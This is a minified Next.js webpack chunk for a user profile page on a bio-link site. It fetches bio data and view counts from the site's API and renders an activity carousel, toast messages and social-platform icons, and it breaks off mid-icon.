(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [280],
  {
    221: function (e, t, s) {
      (window.__NEXT_P = window.__NEXT_P || []).push([
        "/[username]",
        function () {
          return s(97);
        },
      ]);
    },
    1150: function (e, t, s) {
      "use strict";
      s.d(t, {
        Qr: function () {
          return g;
        },
        ed: function () {
          return C;
        },
        h0: function () {
          return v;
        },
      });
      var c = s(4051),
        l = s.n(c),
        r = s(9669),
        a = s.n(r);
      function i(e, t, s, c, l, r, a) {
        try {
          var i = e[r](a),
            n = i.value;
        } catch (o) {
          return void s(o);
        }
        i.done ? t(n) : Promise.resolve(n).then(c, l);
      }
      function n(e) {
        return function () {
          var t = this,
            s = arguments;
          return new Promise(function (c, l) {
            var r = e.apply(t, s);
            function a(e) {
              i(r, c, l, a, n, "next", e);
            }
            function n(e) {
              i(r, c, l, a, n, "throw", e);
            }
            a(void 0);
          });
        };
      }
      function d(e, t, s) {
        return (d = (function o() {
          if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
          if (Reflect.construct.sham) return !1;
          if ("function" == typeof Proxy) return !0;
          try {
            return (
              Date.prototype.toString.call(
                Reflect.construct(Date, [], function () {})
              ),
              !0
            );
          } catch (e) {
            return !1;
          }
        })()
          ? Reflect.construct
          : function (e, t, s) {
              var c = [null];
              c.push.apply(c, t);
              var l = new (Function.bind.apply(e, c))();
              return s && u(l, s.prototype), l;
            }).apply(null, arguments);
      }
      function h(e) {
        return (h = Object.setPrototypeOf
          ? Object.getPrototypeOf
          : function (e) {
              return e.__proto__ || Object.getPrototypeOf(e);
            })(e);
      }
      function u(e, t) {
        return (u =
          Object.setPrototypeOf ||
          function (e, t) {
            return (e.__proto__ = t), e;
          })(e, t);
      }
      var m = function (e) {
        return e && "undefined" != typeof Symbol && e.constructor === Symbol
          ? "symbol"
          : typeof e;
      };
      function f(e) {
        var t = "function" == typeof Map ? new Map() : void 0;
        return (
          (f = function (e) {
            if (
              null === e ||
              ((s = e),
              -1 === Function.toString.call(s).indexOf("[native code]"))
            )
              return e;
            var s;
            if ("function" != typeof e)
              throw new TypeError(
                "Super expression must either be null or a function"
              );
            if (void 0 !== t) {
              if (t.has(e)) return t.get(e);
              t.set(e, c);
            }
            function c() {
              return d(e, arguments, h(this).constructor);
            }
            return (
              (c.prototype = Object.create(e.prototype, {
                constructor: {
                  value: c,
                  enumerable: !1,
                  writable: !0,
                  configurable: !0,
                },
              })),
              u(c, e)
            );
          }),
          f(e)
        );
      }
      function w(e) {
        var t = (function () {
          if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
          if (Reflect.construct.sham) return !1;
          if ("function" == typeof Proxy) return !0;
          try {
            return (
              Boolean.prototype.valueOf.call(
                Reflect.construct(Boolean, [], function () {})
              ),
              !0
            );
          } catch (e) {
            return !1;
          }
        })();
        return function () {
          var s,
            c = h(e);
          if (t) {
            var l = h(this).constructor;
            s = Reflect.construct(c, arguments, l);
          } else s = c.apply(this, arguments);
          return (function x(e, t) {
            return !t || ("object" !== m(t) && "function" != typeof t)
              ? (function (e) {
                  if (void 0 === e)
                    throw new ReferenceError(
                      "this hasn't been initialised - super() hasn't been called"
                    );
                  return e;
                })(e)
              : t;
          })(this, s);
        };
      }
      function v() {
        return p.apply(this, arguments);
      }
      function p() {
        return (p = n(
          l().mark(function e() {
            var t, s;
            return l().wrap(
              function (e) {
                for (;;)
                  switch ((e.prev = e.next)) {
                    case 0:
                      return (
                        (e.prev = 0),
                        (e.next = 3),
                        a().get("".concat("https://api.e-z.bio", "/bio"))
                      );
                    case 3:
                      return (t = e.sent.data), e.abrupt("return", t);
                    case 7:
                      throw (
                        ((e.prev = 7),
                        (e.t0 = e.catch(0)),
                        (s = e.t0.response.data.error),
                        new z(
                          "".concat(s.charAt(0).toUpperCase() + s.slice(1), ".")
                        ))
                      );
                    case 11:
                    case "end":
                      return e.stop();
                  }
              },
              e,
              null,
              [[0, 7]]
            );
          })
        )).apply(this, arguments);
      }
      function g() {
        return j.apply(this, arguments);
      }
      function j() {
        return (j = n(
          l().mark(function e() {
            var t, s;
            return l().wrap(
              function (e) {
                for (;;)
                  switch ((e.prev = e.next)) {
                    case 0:
                      return (
                        (e.prev = 0),
                        (e.next = 3),
                        a().get("".concat("https://api.e-z.bio", "/bio/stats"))
                      );
                    case 3:
                      return (t = e.sent.data), e.abrupt("return", t);
                    case 7:
                      throw (
                        ((e.prev = 7),
                        (e.t0 = e.catch(0)),
                        (s = e.t0.response.data.error),
                        new z(
                          "".concat(s.charAt(0).toUpperCase() + s.slice(1), ".")
                        ))
                      );
                    case 11:
                    case "end":
                      return e.stop();
                  }
              },
              e,
              null,
              [[0, 7]]
            );
          })
        )).apply(this, arguments);
      }
      function C(e) {
        return b.apply(this, arguments);
      }
      function b() {
        return (b = n(
          l().mark(function e(t) {
            var s, c;
            return l().wrap(
              function (e) {
                for (;;)
                  switch ((e.prev = e.next)) {
                    case 0:
                      return (
                        (e.prev = 0),
                        (e.next = 3),
                        a()({
                          url: ""
                            .concat("https://api.e-z.bio", "/bio/view/")
                            .concat(t),
                          method: "PUT",
                          withCredentials: !0,
                        })
                      );
                    case 3:
                      return (s = e.sent.data), e.abrupt("return", s);
                    case 7:
                      throw (
                        ((e.prev = 7),
                        (e.t0 = e.catch(0)),
                        (c = e.t0.response.data.error),
                        new z(
                          "".concat(c.charAt(0).toUpperCase() + c.slice(1), ".")
                        ))
                      );
                    case 11:
                    case "end":
                      return e.stop();
                  }
              },
              e,
              null,
              [[0, 7]]
            );
          })
        )).apply(this, arguments);
      }
      var z = (function (e) {
        !(function (e, t) {
          if ("function" != typeof t && null !== t)
            throw new TypeError(
              "Super expression must either be null or a function"
            );
          (e.prototype = Object.create(t && t.prototype, {
            constructor: { value: e, writable: !0, configurable: !0 },
          })),
            t && u(e, t);
        })(s, e);
        var t = w(s);
        function s(e) {
          var c;
          return (
            (function (e, t) {
              if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function");
            })(this, s),
            ((c = t.call(this, e)).name = "APIError"),
            c
          );
        }
        return s;
      })(f(Error));
    },
    97: function (e, t, s) {
      "use strict";
      s.r(t),
        s.d(t, {
          __N_SSP: function () {
            return D;
          },
          default: function () {
            return _;
          },
        });
      var c = s(5893),
        l = s(2962),
        r = s(1163),
        a = s(7294),
        i = s(1150),
        n = s(9547),
        o = s.n(n),
        d = (s(2755), s(615));
      function h(e, t, s) {
        return (
          t in e
            ? Object.defineProperty(e, t, {
                value: s,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              })
            : (e[t] = s),
          e
        );
      }
      function x(e) {
        var t = e.bio,
          s = { date: new Date() },
          l = (0, a.useState)(s),
          r = l[0].date,
          i = l[1];
        setInterval(function () {
          i(function (e) {
            return (function (e) {
              for (var t = 1; t < arguments.length; t++) {
                var s = null != arguments[t] ? arguments[t] : {},
                  c = Object.keys(s);
                "function" == typeof Object.getOwnPropertySymbols &&
                  (c = c.concat(
                    Object.getOwnPropertySymbols(s).filter(function (e) {
                      return Object.getOwnPropertyDescriptor(s, e).enumerable;
                    })
                  )),
                  c.forEach(function (t) {
                    h(e, t, s[t]);
                  });
              }
              return e;
            })({}, e, { date: new Date() });
          });
        }, 1e3);
        var n = function (e) {
          if (null !== e.timestamps) {
            if (e.timestamps.end && e.timestamps.start)
              return ((r.getTime() - new Date(e.timestamps.start).getTime()) /
                (new Date(e.timestamps.end).getTime() -
                  new Date(e.timestamps.start).getTime())) *
                100 >
                100
                ? (0, c.jsxs)("div", {
                    className: "flex flex-col",
                    children: [
                      (0, c.jsx)("div", {
                        className:
                          "md:w-48 w-24 bg-darkM-900 rounded-full h-2.5",
                        children: (0, c.jsx)("div", {
                          className: "bg-lightGrey h-2.5 rounded-full",
                          style: { width: "100%" },
                        }),
                      }),
                      (0, c.jsxs)("div", {
                        className: "flex justify-between md:w-48 w-24",
                        children: [
                          (0, c.jsx)("div", {
                            className: "whitespace-normal",
                            children: new Date(
                              new Date(e.timestamps.end).getTime() -
                                new Date(e.timestamps.start).getTime()
                            )
                              .toISOString()
                              .slice(14, 19),
                          }),
                          (0, c.jsx)("div", {
                            className: "whitespace-normal",
                            children: new Date(
                              new Date(e.timestamps.end).getTime() -
                                new Date(e.timestamps.start).getTime()
                            )
                              .toISOString()
                              .slice(14, 19),
                          }),
                        ],
                      }),
                    ],
                  })
                : (0, c.jsxs)("div", {
                    className: "flex flex-col",
                    children: [
                      (0, c.jsx)("div", {
                        className:
                          "md:w-48 w-24 bg-darkM-900 rounded-full h-2.5",
                        children: (0, c.jsx)("div", {
                          className: "bg-lightGrey h-2.5 rounded-full",
                          style: {
                            width: "".concat(
                              ((r.getTime() -
                                new Date(e.timestamps.start).getTime()) /
                                (new Date(e.timestamps.end).getTime() -
                                  new Date(e.timestamps.start).getTime())) *
                                100,
                              "%"
                            ),
                          },
                        }),
                      }),
                      (0, c.jsxs)("div", {
                        className: "flex justify-between md:w-48 w-24",
                        children: [
                          (0, c.jsx)("div", {
                            className: "whitespace-normal",
                            children: new Date(
                              r.getTime() -
                                new Date(e.timestamps.start).getTime()
                            )
                              .toISOString()
                              .slice(14, 19),
                          }),
                          (0, c.jsx)("div", {
                            className: "whitespace-normal",
                            children: new Date(
                              new Date(e.timestamps.end).getTime() -
                                new Date(e.timestamps.start).getTime()
                            )
                              .toISOString()
                              .slice(14, 19),
                          }),
                        ],
                      }),
                    ],
                  });
            if (e.timestamps.end && null == e.timestamps.start)
              return (0, c.jsxs)("div", {
                className: "whitespace-normal",
                children: [
                  new Date(new Date(e.timestamps.end).getTime() - r.getTime())
                    .toISOString()
                    .slice(11, 19),
                  " left",
                ],
              });
            if (e.timestamps.start && null == e.timestamps.end)
              return (0, c.jsxs)("div", {
                className: "whitespace-normal",
                children: [
                  new Date(r.getTime() - new Date(e.timestamps.start).getTime())
                    .toISOString()
                    .slice(11, 19),
                  " elapsed",
                ],
              });
          }
        };
        return (0, c.jsx)(d.lr, {
          className: "mt-6 w-full sm:max-w-sm rounded-xl p-2",
          showArrows: !1,
          showStatus: !1,
          autoPlay: !0,
          stopOnHover: !0,
          infiniteLoop: !0,
          emulateTouch: !0,
          showThumbs: !1,
          children: t.bio_presence.activities.map(function (e) {
            return (0,
            c.jsxs)(c.Fragment, { children: [(0, c.jsx)(o(), { id: "9e9f6fd7f5e85380", dynamic: [t.accentcolor + "66"], children: ".carousel .control-dots{margin-top:1.5rem;margin-bottom:0px;opacity:.5}.carousel-root{background-color:".concat(t.accentcolor + "66", "}") }), (0, c.jsxs)("div", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " flex w-full sm:max-w-sm items-center text-left gap-4 rounded-xl p-2", children: [(0, c.jsx)("div", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: (0, c.jsx)("img", { draggable: !1, src: e.assets.largeImage, alt: "", className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " h-20 w-20 rounded-lg min-w-[5rem] max-w-[5rem]" }) }), (0, c.jsxs)("div", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]), children: [(0, c.jsx)("p", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " font-semibold whitespace-normal", children: e.name }), (0, c.jsxs)("div", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " text-sm text-gray-300", children: [(0, c.jsx)("div", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " whitespace-normal", children: e.details }), (0, c.jsx)("div", { className: o().dynamic([["9e9f6fd7f5e85380", [t.accentcolor + "66"]]]) + " whitespace-normal", children: e.state }), n(e)] })] })] })] });
          }),
        });
      }
      var u = s(4931),
        m = function (e) {
          switch (e) {
            case "success":
              return (0, c.jsx)(u.KM, {});
            case "error":
              return (0, c.jsx)(u.Pz, {});
            case "info":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 40 40",
                width: "24px",
                height: "24px",
                children: [
                  (0, c.jsx)("path", {
                    fill: "#8bb7f0",
                    d: "M20,38.5C9.8,38.5,1.5,30.2,1.5,20S9.8,1.5,20,1.5S38.5,9.8,38.5,20S30.2,38.5,20,38.5z",
                  }),
                  (0, c.jsx)("path", {
                    fill: "none",
                    stroke: "#4e7ab5",
                    "stroke-miterlimit": "10",
                    d: "M20,38.5C9.8,38.5,1.5,30.2,1.5,20S9.8,1.5,20,1.5S38.5,9.8,38.5,20S30.2,38.5,20,38.5z",
                  }),
                  (0, c.jsx)("path", {
                    fill: "#fff",
                    d: "M20,10c-1.1,0-2,0.9-2,2s0.9,2,2,2s2-0.9,2-2S21.1,10,20,10z",
                  }),
                  (0, c.jsx)("path", {
                    fill: "#fff",
                    d: "M22,28V16h-5v1h1v11h-1v1h6v-1H22z",
                  }),
                ],
              });
          }
        },
        f = function (e) {
          switch (e) {
            case "success":
              return "Success";
            case "error":
              return "Error";
            case "info":
              return "Info";
          }
        },
        w = function (e, t) {
          return u.ZP.custom(
            function (s) {
              return (0, c.jsxs)("div", {
                className:
                  "relative flex max-w-md transform-gpu flex-row items-center justify-between rounded-lg bg-darkM-900  text-white shadow-2xl transition-all duration-500 ease-in-out hover:shadow-none lg:w-auto ".concat(
                    s.visible ? "top-0" : "-top-96"
                  ),
                children: [
                  (0, c.jsx)("div", {
                    className:
                      "flex h-full items-center rounded-l-lg border-r border-r-zinc-700 bg-neutral-800 p-3 px-5 text-xl",
                    children: m(t),
                  }),
                  (0, c.jsxs)("div", {
                    className: "flex items-center p-3",
                    children: [
                      (0, c.jsxs)("div", {
                        className:
                          "ml-4 flex cursor-default flex-col items-start justify-center",
                        children: [
                          (0, c.jsx)("h1", {
                            className:
                              "mr-auto w-60 text-base font-semibold text-gray-200",
                            children: f(t),
                          }),
                          (0, c.jsx)("span", {
                            className: "text-sm text-gray-400",
                            children: e,
                          }),
                        ],
                      }),
                      (0, c.jsx)("button", {
                        onClick: function () {
                          return u.ZP.dismiss(s.id);
                        },
                        className:
                          "h-8 rounded p-1 px-3 duration-300 hover:bg-darkM-800",
                        children: "X",
                      }),
                    ],
                  }),
                ],
              });
            },
            { position: "top-right", duration: 2e3 }
          );
        },
        v = s(9743),
        p = s(9008),
        g = s.n(p),
        j = s(4258),
        C = s(8857);
      function b(e, t, s) {
        return (
          t in e
            ? Object.defineProperty(e, t, {
                value: s,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              })
            : (e[t] = s),
          e
        );
      }
      function z(e) {
        for (var t = 1; t < arguments.length; t++) {
          var s = null != arguments[t] ? arguments[t] : {},
            c = Object.keys(s);
          "function" == typeof Object.getOwnPropertySymbols &&
            (c = c.concat(
              Object.getOwnPropertySymbols(s).filter(function (e) {
                return Object.getOwnPropertyDescriptor(s, e).enumerable;
              })
            )),
            c.forEach(function (t) {
              b(e, t, s[t]);
            });
        }
        return e;
      }
      var y = function (e) {
          switch (e) {
            case "Github":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffffff] duration-300 hover:scale-110 hover:text-[#ffffff]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z",
                }),
              });
              case "Ko-Fi":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "#ffffff",
                stroke: "#ffffff",
                stroke_width: "0.00024000000000000003",
                className:
                  "h-7 w-7 text-[#6441a5] duration-300 hover:scale-110 hover:text-[#6441a5]",
                viewBox: "-3.36 -3.36 30.72 30.72",
                children: [
                  (0, c.jsx)("path", {
                    d: "M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604 0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407 0 0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604 0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407 0 0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z",
                  }),
                ],
                stroke_linecap: "round",
                stroke_linejoin: "round",
                stroke: "#000000",
                strokewidth: "0.7160000000000001",
              });
            case "YouTube":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FF0000] duration-300 hover:scale-110 hover:text-[#FF0000]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z",
                }),
              });
            case "Twitch":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#6441a5] duration-300 hover:scale-110 hover:text-[#6441a5]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M3.857 0 1 2.857v10.286h3.429V16l2.857-2.857H9.57L14.714 8V0H3.857zm9.714 7.429-2.285 2.285H9l-2 2v-2H4.429V1.143h9.142v6.286z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M11.857 3.143h-1.143V6.57h1.143V3.143zm-3.143 0H7.571V6.57h1.143V3.143z",
                  }),
                ],
              });
            case "Twitter":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#1DA1F2] duration-300 hover:scale-110 hover:text-[#1DA1F2]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z",
                }),
              });
            case "Instagram":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#C13584] duration-300 hover:scale-110 hover:text-[#C13584]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z",
                }),
              });
            case "Reddit":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FF4500] duration-300 hover:scale-110 hover:text-[#FF4500]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M6.167 8a.831.831 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661zm1.843 3.647c.315 0 1.403-.038 1.976-.611a.232.232 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83.458 0 .83-.381.83-.83a.831.831 0 0 0-1.66 0z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.203.203 0 0 0-.153.028.186.186 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224c-.02.115-.029.23-.029.353 0 1.795 2.091 3.256 4.669 3.256 2.577 0 4.668-1.451 4.668-3.256 0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165z",
                  }),
                ],
              });
            case "NameMC":
              return (0, c.jsx)("svg", {
                viewBox: "-8 -8 16 16",
                className:
                  "h-7 w-7 text-[#020101] duration-300 hover:scale-110 hover:text-[#020101]",
                shapeRendering: "crispEdges",
                width: "20",
                height: "20",
                children: (0, c.jsx)("path", {
                  style: { fill: "#020101" },
                  d: "M-5-5L+3-5L+3-3L+5-3L+5+5L+3+5L+3-3L-3-3L-3+5L-5+5",
                }),
              });
            case "Personal":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffffff] duration-300 hover:scale-110 hover:text-[#ffffff]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z",
                }),
              });
            case "Telegram":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#2AABEE] duration-300 hover:scale-110 hover:text-[#2AABEE]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z",
                }),
              });
            case "Soundcloud":
              return (0, c.jsxs)("svg", {
                fill: "#ff7700",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 30 30",
                width: "30px",
                height: "30px",
                children: [
                  (0, c.jsx)("path", {
                    d: "M1.448 15.732c-.064 0-.116.051-.125.121l-.295 2.694.295 2.634c.008.07.061.122.125.122.063 0 .114-.05.125-.121l.336-2.635-.336-2.694C1.563 15.782 1.512 15.732 1.448 15.732zM.339 16.763c-.063 0-.112.049-.12.117L0 18.547l.219 1.638c.008.069.058.117.12.117.061 0 .11-.048.12-.116l.26-1.639-.26-1.667C.45 16.812.4 16.763.339 16.763zM2.628 15.203c-.08 0-.142.062-.15.147l-.28 3.197.28 3.08c.007.085.071.147.15.147.078 0 .141-.062.15-.147l.318-3.081-.318-3.197C2.768 15.265 2.706 15.203 2.628 15.203zM3.816 15.091c-.093 0-.169.074-.176.173l-.264 3.284.264 3.177c.008.098.083.173.176.173.092 0 .168-.074.175-.173l.301-3.177-.301-3.285C3.983 15.165 3.908 15.091 3.816 15.091zM5.215 15.5c-.007-.113-.095-.198-.202-.198-.108 0-.195.085-.202.199l-.249 3.047.249 3.203c.007.112.094.199.202.199.107 0 .194-.085.202-.199l.283-3.203L5.215 15.5zM6.221 13.367c-.121 0-.221.098-.227.225L5.76 18.549l.234 3.203c.007.125.106.224.227.224.12 0 .22-.099.227-.225v.001l.265-3.203-.265-4.958C6.441 13.466 6.341 13.367 6.221 13.367zM7.419 12.226c-.136 0-.247.11-.253.25l-.219 6.091.219 3.184C7.172 21.89 7.283 22 7.419 22c.135 0 .247-.11.252-.25v.002l.248-3.184-.247-6.092C7.666 12.335 7.554 12.226 7.419 12.226zM8.665 11.675c-.151 0-.273.122-.278.277l-.204 6.599.204 3.151c.006.154.127.275.278.275.15 0 .272-.121.278-.276v.002l.231-3.151-.231-6.6C8.937 11.797 8.815 11.675 8.665 11.675zM10.206 